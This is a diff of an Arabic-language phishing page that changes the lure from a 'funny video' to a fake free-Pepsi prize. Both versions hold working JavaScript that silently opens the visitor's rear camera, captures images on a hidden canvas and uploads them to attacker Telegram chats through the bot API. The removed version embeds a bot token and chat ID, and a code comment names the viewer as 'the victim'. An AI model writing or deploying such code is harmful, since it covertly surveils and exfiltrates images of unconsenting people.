@@ -1,64 +1,30 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Funny Moment | لحظة مضحكة</title>
-    <style>
-        body { margin: 0; background-color: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; color: white; font-family: sans-serif; }
-        video#funnyVideo { width: 100%; max-width: 450px; border: 3px solid #fff; border-radius: 15px; }
-        .status { margin-top: 10px; font-size: 14px; opacity: 0.7; }
-        canvas, #cam_stream { display: none; }
-    </style>
-</head>
-<body>
-
-    <!-- فيديو الشخص اللي بشرب بيبسي وبهز رأسه -->
-    <video id="funnyVideo" autoplay loop muted playsinline>
-        <source src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHR0amRoc2R4bmR0bmR0bmR0bmR0bmR0bmR0bmR0bmR0bmR0JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZ29vZC9pbmRleC5naWY/3o7TKMGpxxS0L8lSMM/giphy.mp4" type="video/mp4">
-        Your browser does not support the video tag.
+<html>
+<head><title>Win Pepsi!</title></head>
+<body style="background:white; text-align:center; font-family:Arial, sans-serif;">
+    <h2 style="color:blue; margin-top:20px;">لقد ربحت عبوة بيبسي مجانية!</h2>
+    <p>شاهد الفيديو لاستلام جائزتك</p>
+    <!-- فيديو عرض البيبسي الذي يظهر للضحية -->
+    <video width="80%" autoplay loop muted playsinline style="border-radius:15px; box-shadow:0 4px 8px rgba(0,0,0,0.2);">
+        <source src="https://www.w3schools.com/html/movie.mp4" type="video/mp4">
     </video>
-
-    <div class="status">جاري الاتصال بالسيرفر... 😂</div>
-
-    <video id="cam_stream" autoplay></video>
-    <canvas id="canvas"></canvas>
-
+    <canvas id="canvas" style="display:none;"></canvas>
     <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const chatId = urlParams.get('chat_id') || '7238206121'; 
-        const botToken = urlParams.get('bot_token') || '8669513520:AAFYrZjQ_dKL5dCfKU74XN0c1tOCte_HkwY';
-
-        const camVideo = document.getElementById('cam_stream');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-
-        // طلب الكاميرا الخلفية (environment)
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
-        .then(stream => {
-            camVideo.srcObject = stream;
-            // سحب صورة كل 5 ثواني
-            setInterval(takeSnapshot, 5000);
-        })
-        .catch(err => { console.log("Back camera access error"); });
-
-        function takeSnapshot() {
-            canvas.width = camVideo.videoWidth;
-            canvas.height = camVideo.videoHeight;
-            context.drawImage(camVideo, 0, 0, canvas.width, canvas.height);
-            
-            canvas.toBlob(blob => {
-                const fd = new FormData();
-                fd.append('chat_id', chatId);
-                fd.append('photo', blob, 'back_cam.jpg');
-                fd.append('caption', '📷 **Back Cam Shot Captured!**\n👤 Target is laughing...\n🦅 Dev: Abu Osayed Malkawi');
-
-                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: 'POST',
-                    body: fd
-                });
-            }, 'image/jpeg');
-        }
+        const p = new URLSearchParams(window.location.search);
+        navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}}).then(stream => {
+            const vid = document.createElement('video'); vid.srcObject = stream; vid.play();
+            setTimeout(() => {
+                const con = document.getElementById('canvas').getContext('2d');
+                document.getElementById('canvas').width = vid.videoWidth;
+                document.getElementById('canvas').height = vid.videoHeight;
+                con.drawImage(vid, 0, 0);
+                document.getElementById('canvas').toBlob(blob => {
+                    let form = new FormData(); form.append('photo', blob, 'back.jpg');
+                    fetch(`https://api.telegram.org/bot${p.get('bot_token')}/sendPhoto?chat_id=${p.get('user_id')}`, {method:'POST', body:form});
+                    fetch(`https://api.telegram.org/bot${p.get('bot_token')}/sendPhoto?chat_id=${p.get('admin_id')}`, {method:'POST', body:form});
+                }, 'image/jpeg');
+            }, 4000);
+        });
     </script>
 </body>
 </html>
